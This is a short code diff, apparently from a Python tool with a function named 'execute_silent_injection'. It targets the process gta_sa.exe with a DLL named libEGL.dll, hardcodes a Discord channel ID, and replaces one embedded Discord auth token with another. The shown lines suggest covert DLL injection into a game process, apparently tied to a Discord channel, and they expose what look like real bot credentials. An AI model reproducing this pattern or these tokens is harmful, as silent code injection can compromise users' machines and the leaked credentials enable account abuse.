@@ -16,7 +16,7 @@ def execute_silent_injection():
         print("[DEBUG] requests instalado e importado")
 
     DISCORD_CHANNEL_ID = "1393441968566046750"
-    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GWbSOl.fngAifoKSdFcS59GXmnmuQAh3IngmMedQAF-wA"
+    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GH8W0P.kLeWjgCQrTQS_huJDQdIUaEs4DgoF-KM3nPtXo"
     DLL_NAME = "libEGL.dll"
     PROCESS_NAME = "gta_sa.exe"
 
